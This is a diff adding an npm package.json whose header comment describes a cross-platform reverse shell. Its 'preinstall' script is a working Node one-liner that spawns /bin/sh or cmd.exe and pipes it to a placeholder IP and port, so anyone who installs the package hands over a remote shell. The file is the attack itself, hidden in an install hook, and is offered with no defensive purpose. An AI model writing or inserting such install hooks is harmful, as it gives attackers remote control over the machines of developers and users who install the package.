@@ -1,0 +1,13 @@
+#Expands the reverse shell concept to work seamlessly on both Linux and Windows systems by dynamically selecting the appropriate shell command (/bin/sh or cmd.exe).
+{
+  "name": "repo-private",
+  "version": "1.0.1",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node -e \"const { exec } = require('child_process'); const net = require('net'); const os = require('os'); let command; if (os.platform() === 'win32') { command = 'cmd.exe'; } else { command = '/bin/sh'; } const sh = exec(command); const client = new net.Socket(); client.connect(YOUR-PORT, 'YOUR-IP', function() { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); sh.on('exit', function() { client.end(); });\""
+  },
+  "author": "",
+  "license": "ISC"
+}
